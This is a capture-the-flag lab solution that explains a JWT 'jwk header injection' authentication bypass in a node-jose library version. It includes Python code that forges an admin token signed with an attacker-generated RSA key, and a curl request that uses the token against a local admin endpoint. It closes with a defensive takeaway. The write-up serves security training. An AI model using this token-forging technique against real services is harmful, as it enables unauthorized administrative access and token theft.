# Solution - Lab #6: Trojan Keys

## Root Cause

`node-jose@0.10.0` contains a flaw in `lib/jws/verify.js`. When the token header includes a `jwk` field, the library extracts and uses that key directly for verification - completely bypassing the application's trusted keystore.

The developer's verification code is correct:

```javascript
async function verifyToken(token) {
  await ready;
  const result = await jose.JWS.createVerify(keystore).verify(token);
  return JSON.parse(result.payload);
}
```

The keystore is passed in, but the library ignores it when `header.jwk` is present. This was fixed in `node-jose@0.11.0`.

## Exploit Steps

### 1. Get a legitimate token

Login as any user (e.g. `alice`). Inspect the `session` cookie - it is an RS256 JWT with no `jwk` field in the header.

### 2. Generate an attacker RSA keypair

```python
from cryptography.hazmat.primitives.asymmetric import rsa
attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
```

### 3. Build the forged token

Embed the attacker public key as `jwk` in the header:

```python
jwk = {
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "n": int_to_b64url(pub.n),
    "e": int_to_b64url(pub.e),
}
header  = b64url_enc(json.dumps({"alg":"RS256","typ":"JWT","jwk":jwk}, separators=(",",":")))
payload = b64url_enc(json.dumps({"name":"hacker","role":"admin","iat":1715000000}, separators=(",",":")))
sig     = b64url_enc(rs256_sign(attacker_key, f"{header}.{payload}".encode()))
token   = f"{header}.{payload}.{sig}"
```

### 4. Call the admin endpoint

```bash
curl http://localhost:3000/api/admin/tokens \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{jwk_1nj3ct10n_y0ur_k3y_y0ur_rul35}",
  "tokens": [...]
}
```

## Automated PoC

```bash
pip install requests cryptography pwntools
python poc.py
```

## Takeaway

Never trust key material from the token itself. The verification key must always come from an out-of-band trusted source (a keystore, a config file, an environment variable) - never from the token being verified.

## References

- [Lab: JWT authentication bypass via jwk header injection (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection) - Lab using Burp's JWT Editor to embed a self-generated RSA key in the jwk header
- [Critical vulnerabilities in JSON Web Token libraries - Auth0](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) - Historical context on why JWT libraries must never use embedded key material for verification
- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) - Practical steps for embedding a forged JWK and signing the token with the matching private key
